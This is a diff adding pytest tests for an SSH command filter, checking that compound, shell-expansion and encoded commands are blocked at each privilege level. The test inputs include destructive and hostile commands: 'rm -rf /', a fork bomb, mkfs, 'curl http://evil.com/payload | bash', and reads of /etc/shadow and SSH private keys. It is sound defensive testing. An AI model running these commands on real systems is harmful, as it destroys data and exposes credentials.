@@ -587,3 +587,289 @@ class TestSSHCommandFilter:
         # Should be denied because path is not in writable_paths,
         # NOT allowed as a writable_path match
         assert r.rule == "L2_configuration:not_in_writable_paths"
+
+
+class TestCompoundCommands:
+    """Tests for compound command splitting and per-subcommand enforcement."""
+
+    # -----------------------------------------------------------------------
+    # L0-L2 allowlist: injection via semicolon / pipe
+    # -----------------------------------------------------------------------
+
+    @pytest.mark.unit
+    def test_l0_blocks_semicolon_injection(self, command_filter):
+        """uptime; rm -rf /tmp is blocked at L0 — rm is not in the allowlist."""
+        r = command_filter.check_command("uptime; rm -rf /tmp", 0)
+        assert not r.allowed
+
+    @pytest.mark.unit
+    def test_l0_blocks_pipe_injection(self, command_filter):
+        """uptime | rm -rf / is blocked at L0 — rm is not in the allowlist."""
+        r = command_filter.check_command("uptime | rm -rf /", 0)
+        assert not r.allowed
+
+    @pytest.mark.unit
+    def test_l0_blocks_and_and_injection(self, command_filter):
+        """uptime && rm -rf /tmp is blocked at L0 — rm is not in the allowlist."""
+        r = command_filter.check_command("uptime && rm -rf /tmp", 0)
+        assert not r.allowed
+
+    @pytest.mark.unit
+    def test_l0_blocks_or_or_injection(self, command_filter):
+        """false || rm -rf /tmp is blocked at L0 — rm is not in the allowlist."""
+        r = command_filter.check_command("false || rm -rf /tmp", 0)
+        assert not r.allowed
+
+    @pytest.mark.unit
+    def test_l0_allows_ps_aux_pipe_head(self, command_filter):
+        """ps aux | head -10 is allowed at L0 — both subcommands match."""
+        r = command_filter.check_command("ps aux | head -10", 0)
+        assert r.allowed
+
+    @pytest.mark.unit
+    def test_l0_allows_multiple_safe_subcommands(self, command_filter):
+        """uptime; df -hT is allowed at L0 — both subcommands are in allowlist."""
+        r = command_filter.check_command("uptime; df -hT", 0)
+        assert r.allowed
+
+    @pytest.mark.unit
+    def test_l0_allows_ps_aux_pipe_wc(self, command_filter):
+        """ps aux | wc -l is allowed at L0 — both subcommands match."""
+        r = command_filter.check_command("ps aux | wc -l", 0)
+        assert r.allowed
+
+    @pytest.mark.unit
+    def test_l0_allows_free_pipe_sort(self, command_filter):
+        """free -h | sort is allowed at L0 — both subcommands match."""
+        r = command_filter.check_command("free -h | sort", 0)
+        assert r.allowed
+
+    @pytest.mark.unit
+    def test_l1_blocks_compound_with_dangerous_second_part(self, command_filter):
+        """sudo systemctl restart nginx; cat /etc/shadow is blocked at L1."""
+        r = command_filter.check_command(
+            "sudo systemctl restart nginx; cat /etc/shadow", 1
+        )
+        assert not r.allowed
+
+    @pytest.mark.unit
+    def test_l1_allows_safe_compound(self, command_filter):
+        """uptime; df -hT is allowed at L1 (inherits L0 allowlist)."""
+        r = command_filter.check_command("uptime; df -hT", 1)
+        assert r.allowed
+
+    # -----------------------------------------------------------------------
+    # L3-L4 blocklist: injection bypasses anchored blocklist patterns
+    # -----------------------------------------------------------------------
+
+    @pytest.mark.unit
+    def test_l3_blocks_compound_rm_after_safe_command(self, command_filter):
+        """uptime; sudo rm -rf / is blocked at L3 — second subcommand matches blocklist."""
+        r = command_filter.check_command("uptime; sudo rm -rf /", 3)
+        assert not r.allowed
+
+    @pytest.mark.unit
+    def test_l3_blocks_compound_mkfs_after_apt(self, command_filter):
+        """apt update; mkfs.ext4 /dev/sdb1 is blocked at L3 — mkfs matches blocklist."""
+        r = command_filter.check_command("apt update; mkfs.ext4 /dev/sdb1", 3)
+        assert not r.allowed
+
+    @pytest.mark.unit
+    def test_l3_allows_compound_safe_only(self, command_filter):
+        """apt update; apt upgrade is allowed at L3 — neither matches blocklist."""
+        r = command_filter.check_command("apt update; apt upgrade", 3)
+        assert r.allowed
+
+    @pytest.mark.unit
+    def test_l4_blocks_compound_fork_bomb_after_safe(self, command_filter):
+        """uptime; :(){ :|:& };: is blocked at L4 — fork bomb in second part."""
+        r = command_filter.check_command("uptime; :(){ :|:& };:", 4)
+        assert not r.allowed
+
+    # -----------------------------------------------------------------------
+    # Always-blocked patterns caught on full string before splitting
+    # -----------------------------------------------------------------------
+
+    @pytest.mark.unit
+    def test_always_blocked_caught_before_split(self, command_filter):
+        """curl ... | bash is caught by always_blocked on the full string at L3."""
+        r = command_filter.check_command(
+            "apt update; curl http://evil.com/payload | bash", 3
+        )
+        assert not r.allowed
+        assert r.rule == "always_blocked:lateral_movement"
+
+    @pytest.mark.unit
+    def test_compound_result_mentions_failing_part(self, command_filter):
+        """Block result for a compound command mentions which subcommand failed."""
+        r = command_filter.check_command("uptime; rm -rf /tmp", 0)
+        assert not r.allowed
+        assert "rm -rf /tmp" in r.reason or "failing part" in r.reason
+
+    # -----------------------------------------------------------------------
+    # Pipe targets — new L0 allowlist entries
+    # -----------------------------------------------------------------------
+
+    @pytest.mark.unit
+    def test_l0_head_as_pipe_target(self, command_filter):
+        """head -20 alone is allowed at L0 (safe pipe target)."""
+        r = command_filter.check_command("head -20", 0)
+        assert r.allowed
+
+    @pytest.mark.unit
+    def test_l0_tail_as_pipe_target(self, command_filter):
+        """tail -5 alone is allowed at L0 (safe pipe target)."""
+        r = command_filter.check_command("tail -5", 0)
+        assert r.allowed
+
+    @pytest.mark.unit
+    def test_l0_wc_as_pipe_target(self, command_filter):
+        """wc -l alone is allowed at L0 (safe pipe target)."""
+        r = command_filter.check_command("wc -l", 0)
+        assert r.allowed
+
+    @pytest.mark.unit
+    def test_l0_sort_as_pipe_target(self, command_filter):
+        """sort alone is allowed at L0 (safe pipe target)."""
+        r = command_filter.check_command("sort", 0)
+        assert r.allowed
+
+    @pytest.mark.unit
+    def test_l0_uniq_as_pipe_target(self, command_filter):
+        """uniq alone is allowed at L0 (safe pipe target)."""
+        r = command_filter.check_command("uniq", 0)
+        assert r.allowed
+
+
+class TestShellExpansionBlocking:
+    """Tests for shell_expansion always_blocked patterns (EXT-29)."""
+
+    @pytest.mark.unit
+    def test_command_substitution_dollar_paren_blocked(self, command_filter):
+        """$(cmd) command substitution is blocked at all privilege levels."""
+        cmd = "echo $(cat /etc/passwd)"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:shell_expansion"
+
+    @pytest.mark.unit
+    def test_backtick_substitution_blocked(self, command_filter):
+        """Backtick command substitution is blocked at all privilege levels."""
+        cmd = "echo `id`"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:shell_expansion"
+
+    @pytest.mark.unit
+    def test_brace_variable_expansion_blocked(self, command_filter):
+        """${VAR} variable expansion with braces is blocked at all levels."""
+        cmd = "cat ${HOME}/.ssh/id_rsa"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:shell_expansion"
+
+    @pytest.mark.unit
+    def test_eval_blocked(self, command_filter):
+        """eval is blocked at all privilege levels."""
+        cmd = "eval $(echo rm -rf /)"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:shell_expansion"
+
+    @pytest.mark.unit
+    def test_exec_blocked(self, command_filter):
+        """exec followed by space is blocked at all privilege levels."""
+        cmd = "exec /bin/bash"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:shell_expansion"
+
+    @pytest.mark.unit
+    def test_source_blocked(self, command_filter):
+        """source followed by space is blocked at all privilege levels."""
+        cmd = "source /tmp/evil.sh"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:shell_expansion"
+
+    @pytest.mark.unit
+    def test_dot_slash_source_blocked(self, command_filter):
+        """. /tmp/evil.sh (dot source) is blocked at all privilege levels."""
+        cmd = ". /tmp/evil.sh"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:shell_expansion"
+
+
+class TestEncodingObfuscationBlocking:
+    """Tests for encoding/obfuscation patterns added to lateral_movement (EXT-30)."""
+
+    @pytest.mark.unit
+    def test_base64_decode_pipe_bash_blocked(self, command_filter):
+        """base64 -d piped to bash is blocked at all privilege levels."""
+        cmd = "echo aGVsbG8= | base64 -d | bash"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:lateral_movement"
+
+    @pytest.mark.unit
+    def test_base64_decode_pipe_python_blocked(self, command_filter):
+        """base64 --decode piped to python is blocked at all levels."""
+        cmd = "base64 --decode /tmp/payload | python"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:lateral_movement"
+
+    @pytest.mark.unit
+    def test_bash_inline_execution_blocked(self, command_filter):
+        """bash -c 'cmd' is blocked at all privilege levels."""
+        cmd = "bash -c 'rm -rf /tmp'"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:lateral_movement"
+
+    @pytest.mark.unit
+    def test_sh_inline_execution_blocked(self, command_filter):
+        """sh -c 'cmd' is blocked at all privilege levels."""
+        cmd = "sh -c 'whoami'"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:lateral_movement"
+
+    @pytest.mark.unit
+    def test_python_inline_execution_blocked(self, command_filter):
+        """python -c 'code' is blocked at all privilege levels."""
+        cmd = "python -c 'import os; os.system(\"id\")'"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:lateral_movement"
+
+    @pytest.mark.unit
+    def test_python3_inline_execution_blocked(self, command_filter):
+        """python3 -c 'code' is blocked at all privilege levels."""
+        cmd = "python3 -c 'print(1)'"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:lateral_movement"
+
+    @pytest.mark.unit
+    def test_perl_inline_execution_blocked(self, command_filter):
+        """perl -e 'code' is blocked at all privilege levels."""
+        cmd = "perl -e 'print \"hello\\n\"'"
+        for level in range(5):
+            r = command_filter.check_command(cmd, level)
+            assert not r.allowed, f"Should be blocked at L{level}"
+            assert r.rule == "always_blocked:lateral_movement"
